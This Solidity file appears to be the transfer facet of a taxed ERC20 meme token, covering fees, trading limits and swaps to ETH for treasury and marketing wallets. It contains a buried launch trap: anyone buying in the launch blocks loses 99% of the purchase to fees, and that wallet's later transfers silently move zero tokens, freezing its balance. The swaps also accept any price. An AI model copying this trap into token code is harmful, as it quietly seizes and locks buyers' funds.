// https://sats.vision
// https://twitter.com/satslabs_
// https://t.me/satslabs

// SPDX-License-Identifier: AGPL-3.0-or-later

pragma solidity >=0.7.5;
import "./TestLib.sol";
contract _transferFacet is Ownable {
    using SafeMath for uint256;

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        uint256 fees = 0;

        if (ds.limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !ds.swapping
            ) {
                if (!ds.tradingActive) {
                    require(
                        ds._isExcludedFromFees[from] ||
                            ds._isExcludedFromFees[to],
                        "Trading is not active."
                    );
                }

                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.
                if (ds.transferDelayEnabled) {
                    if (
                        to != owner() &&
                        to != address(ds.uniswapV2Router) &&
                        to != address(ds.uniswapV2Pair)
                    ) {
                        require(
                            ds._holderLastTransferTimestamp[tx.origin] <
                                block.number,
                            "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                        );
                        ds._holderLastTransferTimestamp[tx.origin] = block
                            .number;
                    }
                }

                //when buy
                if (
                    ds.automatedMarketMakerPairs[from] &&
                    !ds._isExcludedMaxTransactionAmount[to]
                ) {
                    require(
                        amount <= ds.maxTransactionAmount,
                        "Buy transfer amount exceeds the ds.maxTransactionAmount."
                    );
                    require(
                        amount + balanceOf(to) <= ds.maxWallet,
                        "Max wallet exceeded"
                    );
                }
                //when sell
                else if (
                    ds.automatedMarketMakerPairs[to] &&
                    !ds._isExcludedMaxTransactionAmount[from]
                ) {
                    require(
                        amount <= ds.maxTransactionAmount,
                        "Sell transfer amount exceeds the ds.maxTransactionAmount."
                    );
                } else if (!ds._isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= ds.maxWallet,
                        "Max wallet exceeded"
                    );
                }
                // Add to marketmakers for launch
                if (
                    ds.automatedMarketMakerPairs[from] &&
                    ds.enableBlock != 0 &&
                    block.number <= ds.enableBlock
                ) {
                    ds.launchMarketMaker[to] = true;
                    fees = amount.mul(99).div(100);
                    super._transfer(from, to, amount - fees);
                    return;
                }
            }
        }

        if (ds.launchMarketMaker[from] || ds.launchMarketMaker[to]) {
            super._transfer(from, to, 0);
            return;
        }

        if (
            ds.swapEnabled &&
            !ds.swapping &&
            !ds._isExcludedFromFees[from] &&
            !ds._isExcludedFromFees[to] &&
            !ds.automatedMarketMakerPairs[from]
        ) {
            ds.swapping = true;

            swapBack();

            ds.swapping = false;
        }

        bool takeFee = !ds.swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (ds._isExcludedFromFees[from] || ds._isExcludedFromFees[to]) {
            takeFee = false;
        }

        ds.tokensForBurn = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            // on sell
            if (ds.automatedMarketMakerPairs[to] && ds.sellTotalFees > 0) {
                fees = amount.mul(ds.sellTotalFees).div(100);
                ds.tokensForLiquidity +=
                    (fees * ds.sellLiquidityFee) /
                    ds.sellTotalFees;
                ds.tokensForBurn = (fees * ds.sellBurnFee) / ds.sellTotalFees;
                ds.tokensForTreasury +=
                    (fees * ds.sellTreasuryFee) /
                    ds.sellTotalFees;
                ds.tokensForMarketing +=
                    (fees * ds.sellMarketingFee) /
                    ds.sellTotalFees;
            }
            // on buy
            else if (
                ds.automatedMarketMakerPairs[from] && ds.buyTotalFees > 0
            ) {
                fees = amount.mul(ds.buyTotalFees).div(100);
                ds.tokensForLiquidity +=
                    (fees * ds.buyLiquidityFee) /
                    ds.buyTotalFees;
                ds.tokensForBurn = (fees * ds.buyBurnFee) / ds.buyTotalFees;
                ds.tokensForTreasury +=
                    (fees * ds.buyTreasuryFee) /
                    ds.buyTotalFees;
                ds.tokensForMarketing +=
                    (fees * ds.buyMarketingFee) /
                    ds.buyTotalFees;
            }

            if (fees - ds.tokensForBurn > 0) {
                super._transfer(
                    from,
                    address(this),
                    fees.sub(ds.tokensForBurn)
                );
            }
            if (ds.tokensForBurn > 0) {
                super._transfer(from, deadAddress, ds.tokensForBurn);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }
    function swapBack() private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = ds.tokensForLiquidity +
            ds.tokensForMarketing +
            ds.tokensForTreasury;
        bool success;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > ((totalSupply() * 5) / 10000) * 20) {
            contractBalance = ((totalSupply() * 5) / 10000) * 20;
        }
        // Halve the amount of liquidity tokens
        uint256 liquidityTokens = (contractBalance * ds.tokensForLiquidity) /
            totalTokensToSwap /
            2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);

        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);

        uint256 ethForMarketing = ethBalance.mul(ds.tokensForMarketing).div(
            totalTokensToSwap
        );
        uint256 ethForTreasury = ethBalance.mul(ds.tokensForTreasury).div(
            totalTokensToSwap
        );

        uint256 ethForLiquidity = ethBalance - ethForMarketing - ethForTreasury;

        ds.tokensForLiquidity = 0;
        ds.tokensForMarketing = 0;
        ds.tokensForTreasury = 0;

        (success, ) = address(ds.treasuryWallet).call{value: ethForTreasury}(
            ""
        );

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                ds.tokensForLiquidity
            );
        }

        (success, ) = address(ds.marketingWallet).call{
            value: address(this).balance
        }("");
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();

        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);

        // make the swap
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);

        // add the liquidity
        ds.uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }
}
